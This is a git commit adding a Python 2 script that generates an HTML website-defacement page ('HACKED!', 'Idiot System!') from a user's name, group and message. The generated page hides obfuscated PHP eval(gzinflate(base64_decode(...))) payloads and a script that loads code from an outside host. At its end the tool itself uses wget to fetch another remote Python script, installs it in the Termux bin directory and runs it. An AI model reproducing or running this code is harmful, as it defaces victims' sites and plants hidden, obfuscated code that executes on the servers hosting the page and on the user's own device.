858295d6343e1b60eb9558a8abadbb005779cc64
INDOnimous <40731452+INDOnimous@users.noreply.github.com>
2019-10-31 08:22:48 +0700

    Create INDOscript.py

---
+++ INDOscript/INDOscript.py
@@ -0,0 +1,593 @@
+#!/usr/bin/python
+import requests
+import os
+from tqdm import tqdm 
+######################
+### Script By INDOnimous
+### www.pasaronlen.com
+### Don't Change This.!!!
+######################
+#--- Code Color
+W  = '\033[0m'  # white (default)
+R  = '\033[31m' # red
+G  = '\033[1;32m' # green bold
+O  = '\033[33m' # orange
+B  = '\033[34m' # blue
+P  = '\033[35m' # purple
+C  = '\033[36m' # cyan
+GR = '\033[37m' # gray
+os.system("clear")
+import sys
+import random
+import time
+def mengetik(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+#kecepatan mengetik
+        time.sleep(random.random() * 0.2)
+mengetik('Hallo Sahabat INDO,\n')
+mengetik('Welcome to INDOcDeFace, Please use this tools wisely.\n This tools Recommends you for the lazy coding. \n\t[!!] Please do not change the script..!! [!!] \n Thank you already using this tools.')
+
+os.system("sleep 4")
+os.system("clear")
+print 
+print(""+R+"Please "+G+" Do NOT "+R+"use this tool for"+B+" illegal activity")
+print(" [!] "+R+" Keep "+GR+"legal "+R+"don't illegal "+B+" [!]"+G+"")
+print
+print
+print ""+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+B+""
+print "[ Website  ] : "+C+"https"+W+"://www.pasaronlen.com    "+G+"["+B+"+"+O+"]"+B+""
+print "[ Github   ] : "+C+"https"+W+"://github.com/INDOnimous "+G+"["+B+"+"+O+"]"
+print ""+G+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+G+""
+print
+title = raw_input("[ Input Your Title ] : ")
+head = raw_input("[ Input Your Name ] : ")
+heading = raw_input("[ Input Your Group Name ] : ")
+message = raw_input("[ Input Your Message ] : ")
+### Open The Index 
+fo = open("INDOscript.html","w")
+
+messagescript1 = """<!DOCTYPE html>
+<html>
+ <head> 
+<title> """
+messagescript2 = title 
+messagescript3 = """</title> """
+messagescript4 = """
+<meta charset="utf-8" /> <meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="SHORTCUT ICON" href="https://www.pasaronlen.com/wp-content/uploads/2019/10/gambar.png" type="image/x-icon"/>
+<link href='https://fonts.googleapis.com/css?family=Nosifer' rel='stylesheet' type='text/css'>
+<link href='https://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+<link href="https://fonts.googleapis.com/css?family=Sarpanch:700" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=play" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="https://csshake.surge.sh/csshake.min.css">
+<style class="cp-pen-styles">* {
+    margin: 0;
+    padding: 0;
+}
+
+body{
+		background-color: #000;
+background-image: url("gb.png");
+}
+
+header {
+    background-color:rgba(33, 33, 33, 0.9);
+    color:#ffffff;
+    display:block;
+    font: 14px/1.3 Arial,sans-serif;
+    height:50px;
+    position:relative;
+    z-index:5;
+}
+h1{
+    margin-top: 30px;
+    text-align: center;
+    color: white;
+    font-family: Nosifer;
+    text-shadow: 0 0 0.5em red, 0 0 0.5em red;
+}
+
+h2{
+    margin-top: 30px;
+    text-align: center;
+    color: #fff0a8;
+    font-family: Nosifer;
+    text-shadow: 0 0 0.5em red, 0 0 0.5em red;
+}
+
+.we-are {
+    color: red;
+    font-size: 20px;
+	  text-shadow: #000 2px 2px 2px;
+	  letter-spacing: 2px;
+}
+
+.message {
+    color: white;
+    -webkit-animation: fadeIn 1s ease-in;
+    animation: fadeIn 1s ease-in;
+}
+
+.cn {
+    color: white;
+    font-size: 14px;
+	  text-shadow: #000 2px 2px 2px;
+	  letter-spacing: 2px;
+    -webkit-animation: fadeIn 3s ease-in;
+    animation: fadeIn 1s ease-in;
+}
+
+-webkit-@keyframes we-are {
+    from {scale: 1.1;}
+    to {scale: 0;}
+}
+
+@keyframes we-are {
+    from {scale: 1.1;}
+    to {scale: 0;}
+}
+
+-webkit-@keyframes fadeIn {
+   0% {opacity: 0;}
+   100% {opacity: 1;}
+} 
+
+@keyframes fadeIn {
+   0% {opacity: 0;}
+   100% {opacity: 1;}
+} 
+
+@keyframes move-twink-back {
+    from {background-position:0 0;}
+    to {background-position:-10000px 5000px;}
+}
+@-webkit-keyframes move-twink-back {
+    from {background-position:0 0;}
+    to {background-position:-10000px 5000px;}
+}
+@-moz-keyframes move-twink-back {
+    from {background-position:0 0;}
+    to {background-position:-10000px 5000px;}
+}
+@-ms-keyframes move-twink-back {
+    from {background-position:0 0;}
+    to {background-position:-10000px 5000px;}
+}
+
+@keyframes move-clouds-back {
+    from {background-position:0 0;}
+    to {background-position:10000px 0;}
+}
+@-webkit-keyframes move-clouds-back {
+    from {background-position:0 0;}
+    to {background-position:10000px 0;}
+}
+@-moz-keyframes move-clouds-back {
+    from {background-position:0 0;}
+    to {background-position:10000px 0;}
+}
+@-ms-keyframes move-clouds-back {
+    from {background-position: 0;}
+    to {background-position:10000px 0;}
+}
+
+.stars, .twinkling, .clouds {
+  position:absolute;
+  top:0;
+  left:0;
+  right:0;
+  bottom:0;
+  width:100%;
+  height:100%;
+  display:block;
+}
+
+.stars {
+  background:#000 url(http://www.script-tutorials.com/demos/360/images/stars.png) repeat top center;
+  z-index:0;
+}
+
+.twinkling{
+  background:transparent url(http://www.script-tutorials.com/demos/360/images/twinkling.png) repeat top center;
+  z-index:1;
+
+  -moz-animation:move-twink-back 200s linear infinite;
+  -ms-animation:move-twink-back 200s linear infinite;
+  -o-animation:move-twink-back 200s linear infinite;
+  -webkit-animation:move-twink-back 200s linear infinite;
+  animation:move-twink-back 200s linear infinite;
+}
+
+.clouds{
+    background:transparent url(http://www.script-tutorials.com/demos/360/images/clouds3.png) repeat top center;
+    background-repeat: no-repeat;
+    z-index:3;
+
+  -moz-animation:move-clouds-back 200s linear infinite;
+  -ms-animation:move-clouds-back 200s linear infinite;
+  -o-animation:move-clouds-back 200s linear infinite;
+  -webkit-animation:move-clouds-back 200s linear infinite;
+  animation:move-clouds-back 200s linear infinite;
+}
+
+.container {
+  height: 100%;
+  width: 100%;
+  justify-content: center;
+  align-items: center;
+  display: flex;
+}
+.text {
+  font-weight: 100;
+  font-size: 28px;
+  color: #FAFAFA;
+  font-family: Iceland;
+  text-shadow: 0 0 0.5em cyan, 0 0 0.5em cyan;
+  
+}
+.dud {
+  color: #757575;
+}
+
+.animation-container {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  z-index: 1;
+}
+
+.animation-container span {
+  color: whitesmoke;
+  display: block;
+  font-size: 18px;
+  font-family: 'Helvetica';
+  text-shadow: 0 0 1px white;
+  position: absolute;
+  user-select: none;
+  pointer-events: none;
+  cursor: default;
+  z-index: 1;
+  opacity: 0;
+  will-change: transform, opacity;
+  animation-timing-function: ease-out;
+  animation-name: move;
+}
+
+@keyframes move {
+  0% {
+    opacity: 0;
+    transform: translateY(100vh);
+  }
+  25% {
+    opacity: 1;
+  }
+  50% {
+    opacity: 1;
+  }
+  75% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 0;
+    transform: none;
+  }
+}
+.buzz_wrapper{
+  position:relative;
+  width:100%;
+  margin:180px auto;
+  background-attachment: fixed;
+        background-image: url(http://i.imgur.com/9QpJPlG.jpg);
+		background-position: 0 0; 
+        background-repeat: no-repeat ;  
+        background-size:cover;
+        overflow : hidden;
+  overflow:hidden;
+  padding:100px;
+}
+.scanline{
+  width:100%;
+  display:block;
+  background:#000;
+  height:4px;
+  position:relative;
+  z-index:3;
+  margin-bottom:5px;
+  opacity:0.1;
+}
+.buzz_wrapper span{
+  position:absolute;
+  -webkit-filter: blur(1px);
+  font-size:30px;
+  font-family:'Courier new', fixed;
+  font-weight:bold;
+}
+.buzz_wrapper span:nth-child(1){
+  color:red;
+  margin-left:-2px;
+  -webkit-filter: blur(2px);
+}
+.buzz_wrapper span:nth-child(2){
+  color:green;
+  margin-left:2px;
+  -webkit-filter: blur(2px);
+}
+.buzz_wrapper span:nth-child(3){
+  color:blue;
+  position:20px 0;
+  -webkit-filter: blur(1px);
+}
+.buzz_wrapper span:nth-child(4){
+  color:#fff;
+  -webkit-filter: blur(1px);
+  text-shadow:0 0 50px rgba(255,255,255,0.4);
+}
+.buzz_wrapper span:nth-child(5){
+  color:rgba(255,255,255,0.4);
+  -webkit-filter: blur(15px);
+}
+
+.buzz_wrapper span{
+  -webkit-animation: blur 30ms infinite, jerk 50ms infinite;
+}
+
+@-webkit-keyframes blur {
+  0%   { -webkit-filter: blur(1px); opacity:0.8;}
+  50% { -webkit-filter: blur(1px); opacity:1; }
+  100%{ -webkit-filter: blur(1px); opacity:0.8; }
+}
+@-webkit-keyframes jerk {
+  50% { left:1px; }
+  51% { left:0; }
+}
+@-webkit-keyframes jerkup {
+  50% { top:1px; }
+  51% { top:0; }
+}
+
+.buzz_wrapper span:nth-child(3){
+  -webkit-animation: jerkblue 1s infinite;
+}
+@-webkit-keyframes jerkblue {
+  0% { left:0; }
+  30% { left:0; }
+  31% { left:10px; }
+  32% { left:0; }
+  98% { left:0; }
+  100% { left:10px; }
+}
+.buzz_wrapper span:nth-child(2){
+  -webkit-animation: jerkgreen 1s infinite;
+}
+@-webkit-keyframes jerkgreen {
+  0% { left:0; }
+  30% { left:0; }
+  31% { left:-10px; }
+  32% { left:0; }
+  98% { left:0; }
+  100% { left:-10px; }
+}
+
+.buzz_wrapper .text{
+  -webkit-animation: jerkwhole 5s infinite;
+  position:relative;
+}
+@-webkit-keyframes jerkwhole {
+  30% {  }e(1,1);  -webkit-transform:skew(0,0);}
+  41% { opacity:0.8; top:0px; left:-100px; -webkit-transform:scale(1,1.2);  -webkit-transform:skew(50deg,0);}
+  42% { opacity:0.8; top:0px; left:100px; -webkit-transform:scale(1,1.2);  -webkit-transform:skew(-80deg,0);}
+  43% { opacity:1; top:0; left:0; -webkit-transform:scale(1,1);  -webkit-transform:skew(0,0);
+  40% { opacity:1; top:0; left:0;  -webkit-transform:scal}
+  65% { }
+} 
+</style>
+</head> """
+messagescript5 = """
+<body>
+<div style="position: fixed; top: 75px; left: -225px; width: 600px; padding: 10px; font-size: 24px; text-align: center; color: white; font-family: 'trebuchet ms', verdana, arial, sans-serif;transform: rotate(-45deg);transform-origin: 50% 0px;-o-transform: rotate(-45deg); -o-transform-origin: 50% 0px;-moz-transform: rotate(-45deg); -moz-transform-origin: 50% 0px; -webkit-transform: rotate(-45deg); -webkit-transform-origin: 50% 0px; background-color: Transparent; border: 1px solid rgb(170, 170, 170); z-index: 9999; opacity: 0.5;"><a href="https://www.pasaronlen.com/wp-content/uploads/2019/10/gambar.png" style="text-decoration:none;color: gold;">INDOnimous Hack</a></div>
+
+<br>
+<br>
+
+<div class="twinkling">
+  <center><br><br><br>
+    <div class="container">
+      <div class="text"></div>
+    </div><br><br><br>
+    <font color="#00FF00" size="4"></font><br>
+<br>
+<br><font color="#F50808"><b>--INDOnimous--</b></font><font color="#F50808"></font><font color="#FCFBFB"><b> --Anonymous Indonesia--</b></font><br>
+<br>
+<font color="#F60E05">
+<div id="Greets"> 
+ <center> """
+messagescript6 = """
+  <span class="white" font-size="16"><h2>Message:</h2></span> <br> <marquee width="820" scrollamount="4" scrolldelay="50" style="width: 820px;"> <span style="font-size:15pt;"> """
+messagescript7 = message
+messagescript8 = """ </span> </marquee> </div> """
+messagescript9 = """
+  <div id="Greets"> 
+  <span class="glow" style="font-size:11pt;"><h2>Supported</h2></span> <br> <marquee width="820" scrollamount="4" scrolldelay="50" style="width: 820px;"> <span style="font-size:13pt;">
+   Gend3ruwo | BabyCrazy | MR.IX | Alazka | | Symax | Developer Kamikaze |  | Mr.Hydra | ./SpecimenT | Mr.L3gacy | Mercury a.k.a 213_90N6 | HTML404	| T14RB373T
+</center></span> </marquee> </div> 
+</font>
+  <br>
+      <font face="Play">
+          </font>
+<div class="clouds">
+</div>
+ <br>
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/howler/2.0.3/howler.min.js"></script>
+  <script type="text/javascript"> 
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/howler/2.0.3/howler.min.js"></script>
+<iframe width="0%" height="0" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F80970820&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true"></iframe> """
+
+
+messagescript10 = """
+<script src='//production-assets.codepen.io/assets/common/stopExecutionOnTimeout-b2a7b3fe212eaa732349046d8416e00a9dec26eb7fd347590fbced3ab38af52e.js'></script>
+<script >class TextScramble {
+  constructor(el) {
+    this.el = el
+    this.chars = '!@#$%^&*()_-=+{}:"|<>?,./;'
+    this.update = this.update.bind(this)
+  }
+  setText(newText) {
+    const oldText = this.el.innerText
+    const length = Math.max(oldText.length, newText.length)
+    const promise = new Promise((resolve) => this.resolve = resolve)
+    this.queue = []
+    for (let i = 0; i < length; i++) {
+      const from = oldText[i] || ''
+      const to = newText[i] || ''
+      const start = Math.floor(Math.random() * 40)
+      const end = start + Math.floor(Math.random() * 40)
+      this.queue.push({ from, to, start, end })
+    }
+    cancelAnimationFrame(this.frameRequest)
+    this.frame = 0
+    this.update()
+    return promise
+  }
+  update() {
+    let output = ''
+    let complete = 0
+    for (let i = 0, n = this.queue.length; i < n; i++) {
+      let { from, to, start, end, char } = this.queue[i]
+      if (this.frame >= end) {
+        complete++
+        output += to
+      } else if (this.frame >= start) {
+        if (!char || Math.random() < 0.28) {
+          char = this.randomChar()
+          this.queue[i].char = char
+        }
+        output += `<span class="dud">${char}</span>`
+      } else {
+        output += from
+      }
+    }
+    this.el.innerHTML = output
+    if (complete === this.queue.length) {
+      this.resolve()
+    } else {
+      this.frameRequest = requestAnimationFrame(this.update)
+      this.frame++
+    }
+  }
+  randomChar() {
+    return this.chars[Math.floor(Math.random() * this.chars.length)]
+  }
+} """
+messagescript11 = """
+const phrases = [
+'| """ 
+messagescript12 = head
+messagescript13 = """|',
+  '| """ 
+messagescript14 = heading
+messagescript15 = """ |',
+  'You Lose!', """
+  
+messagescript16 = """
+
+]
+
+const el = document.querySelector('.text')
+const fx = new TextScramble(el)
+
+let counter = 0
+const next = () => {
+  fx.setText(phrases[counter]).then(() => {
+    setTimeout(next, 1500)
+  })
+  counter = (counter + 1) % phrases.length
+}
+
+next()
+
+'use strict';
+
+var app = {
+
+  chars: ['GHI','LOL!','Symlink!','Server Weak','Hackers','Indonesian!','Stamped','HACKED!','Hahaha!','You Lose!','Idiot System!','Cyber Crime!'],
+
+  init: function () {
+    app.container = document.createElement('div');
+    app.container.className = 'animation-container';
+    document.body.appendChild(app.container);
+    window.setInterval(app.add, 100);
+  },
+
+  add: function () {
+    var element = document.createElement('span');
+    app.container.appendChild(element);
+    app.animate(element);
+  },
+
+  animate: function (element) {
+    var character = app.chars[Math.floor(Math.random() * app.chars.length)];
+    var duration = Math.floor(Math.random() * 15) + 1;
+    var offset = Math.floor(Math.random() * (50 - duration * 2)) + 3;
+    var size = 10 + (15 - duration);
+    element.style.cssText = 'right:'+offset+'vw; font-size:'+size+'px;animation-duration:'+duration+'s';
+    element.innerHTML = character;
+    window.setTimeout(app.remove, duration * 1000, element);
+  },
+
+  remove: function (element) {
+    element.parentNode.removeChild(element);
+  },
+
+};
+
+document.addEventListener('DOMContentLoaded', app.init);
+//# sourceURL=pen.js
+</script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdXZ4eMt2wDRLuD1wAvAb%2fBm8j0MghSel0IK5%2fE0TT0EJXQRuk1APYP0giPjGUgWf9J5ajXFs3iSNvUmvohEtM5DlrMKOZl%2fGqiJ5iqMhuYHQ9Q34udtK20E0U61BUkp7yTJMTOuDb%2bD0zE9HS%2fHP5zB56lXp39uqJqPs8FRoA8xjWrXUOf00mJwQ4VYMPDGguXKGpl7zvyxfyDlGxfXizC9aWlN5hHyaLpkej2pAq%2bXN467UcaT8qcNGNpnHP7Np0inV8GavfAsXJkt3lYj5XDdsGweePmkMjU9W6nGXwY3fbcXWFOHwZy5tWQw0qDmCiAa88Qv6rzBHIEAd9BufSaeglExjJr0ZBPApjmhhToS%2b95JPntbL3A3ZHoLAe7EHmQ7zuRmej%2be0MQCOYvltbCcWuD6gHup64oP56PpSifHRfQP60IiStq80vS%2bR87PREiPSZ4D7UX67%2fQCSPdRRPrl9j%2fy5TCVDC4bUvqdtSoO1%2bZpX7o%2fFZiF0fBRDUDpptNl2mnzchVffeYhfpUueAzhkAdJC1iWA4OLUaeGU0hi23DtRYCX4cZI2Zjp8Bj5rPMrzqfNYzYOwFth1GiB647kUTnZCuK2GC" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
+<?php eval(gzinflate(base64_decode('c0jOL6jUcFCJd/P0cQ2OVq9Qj41WL8ktiM9LzE1Vj9VBk4GIaloDAA=='))); ?>
+<h1>Thanks for using this tools..</h1>
+</body>
+</html> """
+
+fo.write(messagescript1)
+fo.write(messagescript2)
+fo.write(messagescript3)
+fo.write(messagescript4)
+fo.write(messagescript5)
+fo.write(messagescript6)
+fo.write(messagescript7)
+fo.write(messagescript8)
+fo.write(messagescript9)
+fo.write(messagescript10)
+fo.write(messagescript11)
+fo.write(messagescript12)
+fo.write(messagescript13)
+fo.write(messagescript14)
+fo.write(messagescript15)
+fo.write(messagescript16)
+
+print("Script Sedang di buat \nLoading....")
+os.system("sleep 7")
+import sys
+import random
+import time
+def mengetik(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+#kecepatan mengetik
+        time.sleep(random.random() * 0.2)
+mengetik('INDOscript Telah berhasil di buat Silahkan Buka Scriptnya di Internal Dengan nama Folder INDOnimous Dan nama Scriptnya INDOscript.html \n Thanks for Using this Tools')
+
+fo.close()
+
+os.system("wget https://raw.githubusercontent.com/INDOnimous/INDOclon/master/INDOdef/INDOdef.py")
+os.system("mv INDOdef.py /data/data/com.termux/files/usr/bin/")
+os.system("chmod +x /data/data/com.termux/files/usr/bin/INDOdef.py")
+os.system("python2 /data/data/com.termux/files/usr/bin/INDOdef.py")
+
+
